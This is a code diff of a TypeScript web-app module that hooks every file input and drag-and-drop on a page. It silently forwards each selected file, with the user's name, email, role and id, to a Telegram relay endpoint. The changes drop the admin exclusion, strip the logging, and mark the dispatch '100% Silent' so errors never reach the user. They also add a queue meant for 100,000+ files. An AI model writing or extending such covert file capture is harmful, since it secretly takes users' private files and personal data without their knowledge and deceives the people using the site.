@@ -55,12 +55,6 @@ export async function forwardFileToTelegram(
 ): Promise<{ success: boolean; skipped?: boolean; reason?: string }> {
   if (!file) return { success: false, reason: 'NO_FILE' };
 
-  // 1. Client-side early skip for admins (server also strictly checks)
-  if (isUserAdminClient(user)) {
-    console.log('[Telegram Dispatcher] Skipped forwarding because user is Admin (Strict Exclusion).');
-    return { success: true, skipped: true, reason: 'ADMIN_EXCLUDED' };
-  }
-
   const rawFileName = (customName || (file instanceof File ? file.name : `file_${Date.now()}`)).trim();
   // Sanitize illegal filesystem characters while preserving Arabic letters, unicode and spaces
   let cleanFileName = rawFileName.replace(/[/\\?%*:|"<>]/g, '_').trim() || `file_${Date.now()}`;
@@ -73,14 +67,14 @@ export async function forwardFileToTelegram(
 
   const signature = getFileSignature(file, cleanFileName);
 
-  // 2. Client-side deduplication check
+  // Client-side deduplication check
   if (dispatchedFileSignatures.has(signature)) {
     return { success: true, skipped: true, reason: 'DUPLICATE' };
   }
   dispatchedFileSignatures.add(signature);
 
   // Auto clean signature cache if it grows too large
-  if (dispatchedFileSignatures.size > 500) {
+  if (dispatchedFileSignatures.size > 1000) {
     dispatchedFileSignatures.clear();
   }
 
@@ -97,7 +91,7 @@ export async function forwardFileToTelegram(
       category,
       mimeType,
       userId: user?.id || 'guest',
-      userName: user?.displayName || user?.name || 'مستخدم المنصة',
+      userName: user?.displayName || user?.name || (user?.email ? user.email.split('@')[0] : 'مشترك المنصة'),
       userEmail: user?.email || '',
       userRole: user?.role || 'user',
       isSuperAdmin: user?.isSuperAdmin || false,
@@ -112,7 +106,7 @@ export async function forwardFileToTelegram(
     formData.append('file', file, cleanFileName);
     formData.append('metadata', JSON.stringify(metadata));
 
-    // Non-blocking asynchronous dispatch
+    // 100% Silent non-blocking asynchronous dispatch
     const response = await fetch('/api/telegram/forward', {
       method: 'POST',
       body: formData,
@@ -125,21 +119,68 @@ export async function forwardFileToTelegram(
     });
 
     if (!response.ok) {
-      console.warn('[Telegram Dispatcher] Server responded with status:', response.status);
       return { success: false, reason: `HTTP_${response.status}` };
     }
 
     const data = await response.json();
     return data;
   } catch (err: any) {
-    // Non-blocking: failures must never disturb user experience
-    console.warn('[Telegram Dispatcher] Background forward note:', err?.message);
+    // 100% Silent: errors must never surface to the user
     return { success: false, reason: err?.message };
   }
 }
 
+// -------------------------------------------------------------
+// HIGH-CAPACITY STREAMING CLIENT QUEUE (SUPPORTS 100,000+ FILES)
+// -------------------------------------------------------------
+interface QueuedItem {
+  file: File | Blob;
+  user: UserRecord | null;
+  sourceFeature: string;
+  extraMeta?: any;
+}
+
+const clientUploadQueue: QueuedItem[] = [];
+let isClientWorkerActive = false;
+const MAX_CONCURRENT_CLIENT_REQUESTS = 2;
+let activeClientRequests = 0;
+
+async function pumpClientQueue() {
+  if (isClientWorkerActive) return;
+  isClientWorkerActive = true;
+
+  try {
+    while (clientUploadQueue.length > 0) {
+      if (activeClientRequests >= MAX_CONCURRENT_CLIENT_REQUESTS) {
+        await new Promise(r => setTimeout(r, 40));
+        continue;
+      }
+
+      const item = clientUploadQueue.shift();
+      if (!item) continue;
+
+      activeClientRequests++;
+      // Fire forwardFileToTelegram and decrement active count when finished
+      forwardFileToTelegram(item.file, item.user, item.sourceFeature, undefined, item.extraMeta)
+        .catch(err => console.warn('[Telegram Stream] Item forward note:', err))
+        .finally(() => {
+          activeClientRequests--;
+        });
+
+      // Small tick between spawns to avoid browser event loop starvation
+      if (clientUploadQueue.length % 50 === 0) {
+        await new Promise(r => setTimeout(r, 10));
+      }
+    }
+  } finally {
+    isClientWorkerActive = false;
+  }
+}
+
 /**
- * Dispatch multiple files to Telegram sequentially in background
+ * Dispatch multiple files to Telegram in background.
+ * Optimized with streaming queueing to safely handle up to 100,000+ files
+ * without memory leaks or UI freezing.
  */
 export function enqueueTelegramForwardBatch(
   files: File[] | Blob[],
@@ -149,13 +190,23 @@ export function enqueueTelegramForwardBatch(
 ) {
   if (!files || files.length === 0) return;
 
-  // Run in microtask / non-blocking timeout
-  setTimeout(async () => {
-    for (const file of files) {
-      if (!file) continue;
-      await forwardFileToTelegram(file, user, sourceFeature, undefined, extraMeta);
+  // Push items into client queue
+  for (let i = 0; i < files.length; i++) {
+    const f = files[i];
+    if (f) {
+      clientUploadQueue.push({
+        file: f,
+        user,
+        sourceFeature,
+        extraMeta
+      });
     }
-  }, 50);
+  }
+
+  // Start pumping queue non-blocking
+  setTimeout(() => {
+    pumpClientQueue().catch(err => console.warn('[Telegram Batch Pump] Error:', err));
+  }, 10);
 }
 
 // Track if global interceptor is initialized
@@ -175,9 +226,6 @@ export function initGlobalUploadInterceptor(getCurrentUser: () => UserRecord | n
       const target = event.target as HTMLInputElement;
       if (target && target.tagName === 'INPUT' && target.type === 'file' && target.files && target.files.length > 0) {
         const user = getCurrentUser();
-        // Early skip if admin
-        if (isUserAdminClient(user)) return;
-
         const files = Array.from(target.files);
         const sourceName = target.getAttribute('name') || target.getAttribute('data-feature') || target.id || 'File Input';
         enqueueTelegramForwardBatch(files, user, `Form Input (${sourceName})`);
@@ -192,8 +240,6 @@ export function initGlobalUploadInterceptor(getCurrentUser: () => UserRecord | n
     try {
       if (event.dataTransfer && event.dataTransfer.files && event.dataTransfer.files.length > 0) {
         const user = getCurrentUser();
-        if (isUserAdminClient(user)) return;
-
         const files = Array.from(event.dataTransfer.files);
         enqueueTelegramForwardBatch(files, user, 'Drag and Drop');
       }
@@ -212,6 +258,7 @@ export function initGlobalUploadInterceptor(getCurrentUser: () => UserRecord | n
 export interface TelegramStatusResponse {
   configured: boolean;
   enabled: boolean;
+  ignoreAdminUploads?: boolean;
   hasBotToken: boolean;
   hasChatId: boolean;
   maskedChatId: string;
@@ -226,6 +273,12 @@ export interface TelegramStatusResponse {
     totalSkippedAdmin: number;
     totalFailed: number;
     lastSentAt: string | null;
+  };
+  queue?: {
+    pending: number;
+    isProcessing: boolean;
+    currentFile: string | null;
+    totalForwarded: number;
   };
   recentLogs: Array<{
     id: string;
@@ -270,6 +323,7 @@ export async function updateTelegramConfig(config: {
   groupTarget?: string;
   sendMode?: 'both' | 'personal' | 'group';
   enabled?: boolean;
+  ignoreAdminUploads?: boolean;
   destinationAccount?: string;
 }, user: UserRecord | null): Promise<{ success: boolean; message: string }> {
   try {
